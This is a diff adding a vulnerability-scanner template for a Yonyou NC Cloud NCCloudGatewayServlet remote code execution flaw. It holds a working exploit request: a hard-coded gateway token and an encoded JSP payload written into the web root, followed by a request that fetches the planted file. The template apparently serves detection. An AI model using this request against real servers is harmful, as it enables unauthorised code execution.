@@ -1,0 +1,51 @@
+http:
+- body: "{\n  \"groupCode\": \"1002\",\n  \"user\": \"1002\",\n  \"serviceInfo\":\
+    \ {\n    \"serviceClassName\": \"nc.itf.uap.pfxx.IPFxxFileService\",\n    \"serviceMethodName\"\
+    : \"writeDocToXMLFile\",\n    \"serviceMethodArgInfo\": [\n      {\n        \"\
+    argType\": {\n          \"body\": \"java.lang.Byte\"\n        },\n        \"argValue\"\
+    : {\n          \"body\": [60,37,32,111,117,116,46,112,114,105,110,116,108,110,40,34,89,79,78,89,79,85,95,82,67,69,95,86,85,76,78,95,123,123,114,97,110,100,111,109,95,115,116,114,125,125,34,41,59,32,37,62]\n\
+    \        },\n        \"agg\": false,\n        \"isArray\": true,\n        \"isPrimitive\"\
+    : true\n      },\n      {\n        \"argType\": {\n          \"body\": \"java.lang.String\"\
+    \n        },\n        \"argValue\": {\n          \"body\": \"./webapps/u8c_web/{{randstr}}.jsp\"\
+    \n        },\n        \"agg\": false,\n        \"isArray\": false,\n        \"\
+    isPrimitive\": false\n      }\n    ]\n  }\n}\n"
+  extractors:
+  - group: 1
+    name: jsp_filename
+    part: body
+    regex:
+    - '"path":"\\.\\\\webapps\\\\u8c_web\\\\([^"]+)\\.jsp"'
+    type: regex
+  headers:
+    Accept: '*/*'
+    Content-Type: application/json
+    Host: '{{Hostname}}'
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+    gatewaytoken: TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
+  matchers:
+  - condition: and
+    dsl:
+    - status_code == 200
+    - contains(body, "retObj")
+    - contains(body, "path")
+    - contains(body, "File")
+    type: dsl
+  method: POST
+  path:
+  - '{{BaseURL}}/service/NCCloudGatewayServlet'
+- matchers:
+  - condition: and
+    type: word
+    words:
+    - YONYOU_RCE_VULN_{{randstr}}
+  method: GET
+  path:
+  - '{{BaseURL}}/u8c_web/{{randstr}}.jsp'
+  - '{{BaseURL}}/u8c_web/{{jsp_filename}}.jsp'
+id: yongyou-ncloud-NCCloudGatewayServlet-rce
+info:
+  author: PokerSec
+  description: yongyou-ncloud-NCCloudGatewayServlet-rce
+  name: yongyou-ncloud-NCCloudGatewayServlet-rce
+  severity: critical
+  tags: yonyou,u8cloud,rce
